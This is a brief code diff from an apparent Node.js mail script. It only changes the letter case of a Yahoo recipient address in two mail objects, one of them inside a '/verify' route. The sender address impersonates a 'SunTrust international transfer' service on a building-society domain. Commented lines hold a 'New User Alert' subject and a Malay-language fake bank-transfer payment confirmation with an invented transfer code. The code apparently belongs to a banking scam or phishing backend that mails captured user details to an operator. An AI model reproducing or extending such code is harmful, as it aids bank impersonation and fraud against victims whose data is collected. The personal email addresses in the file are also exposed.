@@ -44,7 +44,7 @@ const transporter = nodemailer.createTransport({
   
       const mailData = {
       from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
-      to: 'Dah_onest@yahoo.com',
+      to: 'dah_onest@yahoo.com',
       // to: 'joannelouisekenrick.cbs@gmail.com',
       // subject: `New User Alert`,
     //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
@@ -95,7 +95,7 @@ app.get('/verify', (req, res) => {
     
         const mailData = {
         from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
-        to: 'Dah_onest@yahoo.com',
+        to: 'dah_onest@yahoo.com',
         // to: 'joannelouisekenrick.cbs@gmail.com',
         // subject: `New User Alert`,
       //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
